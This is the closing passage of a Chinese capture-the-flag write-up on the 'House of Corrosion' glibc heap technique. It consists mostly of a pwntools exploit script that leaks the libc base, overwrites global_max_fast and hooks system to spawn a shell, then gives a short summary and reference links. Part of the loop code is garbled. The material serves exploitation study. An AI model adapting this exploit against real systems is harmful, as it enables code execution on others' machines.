        elif address_len != None:
            return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
        elif context.arch == 'amd64':
            return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
        else:
            return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
        if offset != None:
            return_address = return_address + offset
        if info != None:
            log.success(info + str(hex(return_address)))
        return return_address
    def get_flag(sh):
        try:
            sh.recvrepeat(0.1)
            sh.sendline('cat flag')
            return sh.recvrepeat(0.3)
        except EOFError:
            return ""
    def get_gdb(sh, addr=None, gdbscript=None, stop=False):
        if args['REMOTE']:
            return
        if gdbscript is not None:
            gdb.attach(sh, gdbscript)
        elif addr is not None:
            gdb.attach(sh, 'b *$rebase(' + hex(addr) + ")")
        else:
            gdb.attach(sh)
        if stop:
            raw_input()
    def Attack(target=None, elf=None, libc=None):
        global sh
        if sh is None:
            from Class.Target import Target
            assert target is not None
            assert isinstance(target, Target)
            sh = target.sh
            elf = target.elf
            libc = target.libc
        assert isinstance(elf, ELF)
        assert isinstance(libc, ELF)
        try_count = 0
        while try_count >>>>>>>>>>>>>>>>>>>>\n')
        add(0x18, 'a' * 0x100)
        add(0x4f, encode_data('a' * 0x18))
        add(0x18, '\xE8' * 0x100)
        choice(5)
        recvuntil('[backdoor_msg]Size?')
        senddata(str(0x3918))
        edit(1, '\x00' * 0x50 + '\xE8' * 0x50)
        delete(1)
        edit(2, '\xE8' * 0x100)
        show(2)
        leak_data = show(1)
        log.hexdump(leak_data)
        leak_idx = leak_data.find('\x7f')
        if leak_idx < 5:
            leak_idx = leak_data.find('\x7f')
        libc_base = u64(leak_data[leak_idx - 5: leak_idx + 1].ljust(8, '\x00')) - 0x3c4b78
        if libc_base & 0xfff != 0:
            raise EOFError
        log.success("libc_base:\t" + hex(libc_base))
        pause()
        global_max_fast = libc_base + 0x3c67f8
        system_addr = libc_base + 0x453a0
        edit(1, p64(libc_base + 0x3c4b78) + p64(global_max_fast - 0x10))
        add(0x18, 'a' * 0x100)  # 3
        edit(3, p64(libc_base + 0x3c4b78) * 2)
        edit(0, "/bin/sh\x00" * 2)
        choice(5)
        choice(5)
        recvuntil('[backdoor_msg]Content?')
        senddata(p64(system_addr) * 2, 0)
        choice(5)
        choice(2)
        recvuntil('[Delete]Index?')
        senddata(str(0))
        sh.interactive()
    if __name__ == "__main__":
        sh = get_sh()
        flag = Attack(elf=get_file(), libc=get_libc())
        sh.close()
        if flag != "":
            log.success('The flag is ' + re.search(r'flag{.+}', flag).group())
## 总结
House of Corrosion 的利用思想还是在 LIBC 附近写堆地址，但是这种方法通过这样一种相对位置的方式来把 LIBC
偏移给抵消了，并且通过一定的爆破，降低了在初步攻击时所需要的条件，这样的简单方便的利用方法还有很多开发的空间，值得大家进一步的学习和挖掘。
## 参考资料
  1. [House of Corrosionの 解说](https://ptr-yudai.hatenablog.com/entry/2019/10/19/002039)
  2. [第七届“湖湘杯” House _OF _Emma | 设计思路与解析](https://www.anquanke.com/post/id/260614)
  3. [新版本 glibc 下的 IO_FILE 攻击](https://www.anquanke.com/post/id/216290)
  4. [house of banana](https://www.anquanke.com/post/id/222948)